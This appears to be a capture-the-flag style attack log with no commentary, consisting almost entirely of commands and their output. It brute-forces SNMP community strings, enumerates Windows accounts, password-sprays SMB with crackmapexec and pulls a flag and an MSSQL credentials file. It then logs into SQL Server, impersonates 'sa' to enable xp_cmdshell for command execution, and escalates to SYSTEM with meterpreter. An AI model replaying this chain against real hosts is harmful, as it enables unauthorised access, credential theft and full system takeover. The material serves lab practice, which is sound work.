

```
for community in $(cat /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt); do
  echo "Trying community string: $community"
  snmpwalk -v2c -c $community server.prod.local | head -10
done
```



```
Trying community string: **redacted**
iso.3.6.1.2.1.1.1.0 = STRING: "Hardware: Intel64 Family 6 Model 85 Stepping 7 AT/AT COMPATIBLE - Software: Windows Version 6.3 (Build 20348 Multiprocessor Free)"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.311.1.1.3.1.2
iso.3.6.1.2.1.1.3.0 = Timeticks: (306460) 0:51:04.60
iso.3.6.1.2.1.1.4.0 = ""
iso.3.6.1.2.1.1.5.0 = STRING: "EC2AMAZ-A251FFF"
iso.3.6.1.2.1.1.6.0 = ""
iso.3.6.1.2.1.1.7.0 = INTEGER: 76
iso.3.6.1.2.1.2.1.0 = INTEGER: 26
iso.3.6.1.2.1.2.2.1.1.1 = INTEGER: 1
iso.3.6.1.2.1.2.2.1.1.2 = INTEGER: 2

```

```
# snmpwalk -v2c -c blue server.prod.local 1.3.6.1.4.1.77.1.2.25                                                                                                                                                                          
iso.3.6.1.4.1.77.1.2.25.1.1.5.71.117.101.115.116 = STRING: "Guest"
iso.3.6.1.4.1.77.1.2.25.1.1.7.116.105.109.111.116.104.121 = STRING: "**redacted**"
iso.3.6.1.4.1.77.1.2.25.1.1.8.115.115.109.45.117.115.101.114 = STRING: "ssm-user"
iso.3.6.1.4.1.77.1.2.25.1.1.13.65.100.109.105.110.105.115.116.114.97.116.111.114 = STRING: "Administrator"
iso.3.6.1.4.1.77.1.2.25.1.1.14.68.101.102.97.117.108.116.65.99.99.111.117.110.116 = STRING: "DefaultAccount"
iso.3.6.1.4.1.77.1.2.25.1.1.18.87.68.65.71.85.116.105.108.105.116.121.65.99.99.111.117.110.116 = STRING: "WDAGUtilityAccount"

```

```
crackmapexec smb server.prod.local -u **redacted** -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt

SMB         server.prod.local 445    EC2AMAZ-A251FFF  [+] EC2AMAZ-A251FFF\**redacted**:**redacted** 

```


```
# smbclient //server.prod.local/**redacted** -U **redacted**                                                                                                                                                                                      
Password for [WORKGROUP\**redacted**]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Fri May 16 22:05:10 2025
  ..                                 DR        0  Tue Feb 25 18:26:23 2025
  flag1.txt                           A       34  Fri May 16 22:05:10 2025
  mssql_creds.txt                     A       39  Tue Feb 25 15:23:39 2025

                7863807 blocks of size 4096. 1903950 blocks available
smb: \> get flag1.txt
getting file \flag1.txt of size 34 as flag1.txt (3.0 KiloBytes/sec) (average 3.0 KiloBytes/sec)
smb: \> get mssql_creds.txt
getting file \mssql_creds.txt of size 39 as mssql_creds.txt (3.2 KiloBytes/sec) (average 3.1 KiloBytes/sec)
smb: \> 
```


```
# python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py **redacted**:**redacted**@server.prod.local                                                                                                                                 
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(EC2AMAZ-A251FFF\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(EC2AMAZ-A251FFF\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (130 19162) 
[!] Press help for extra shell commands
SQL (**redacted**  guest@master)> select @@version;
                                                                                                                                                                                                                                    
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   
Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64) 
        Mar 18 2018 09:11:49 
        Copyright (c) Microsoft Corporation
        Express Edition (64-bit) on Windows Server 2022 Datacenter 10.0 <X64> (Build 20348: ) (Hypervisor)
   

SQL (**redacted**  guest@master)> select loginname from syslogins where sysadmin = 1;
loginname   
---------   
sa          

SQL (**redacted**  guest@master)> enable_xp_cmdshell
ERROR: Line 1: You do not have permission to run the RECONFIGURE statement.
SQL (**redacted**  guest@master)> select distinct b.name from sys.server_permissions a INNER JOIN sys.server_principals b on a.grantor_principal_id = b.principal_id where a.permission_name = 'IMPERSONATE';
name   
----   
sa     

SQL (**redacted**  guest@master)> select system_user
        
-----   
**redacted**   

SQL (**redacted**  guest@master)> execute as login = '**redacted**'
SQL (**redacted**  guest@master)> select system_user
        
-----   
**redacted**   

SQL (**redacted**  guest@master)> execute as login = 'sa'
SQL (sa  dbo@master)> select system_user
     
--   
sa   

SQL (sa  dbo@master)> enable_xp_cmdshell
[*] INFO(EC2AMAZ-A251FFF\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
[*] INFO(EC2AMAZ-A251FFF\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (sa  dbo@master)> exec xp_cmdshell "whoami"
output                        
---------------------------   
nt service\mssql$sqlexpress   

NULL                          

SQL (sa  dbo@master)>
```


privesc:
```
meterpreter > getsystem -> "NT AUTHORITY\SYSTEM"
```
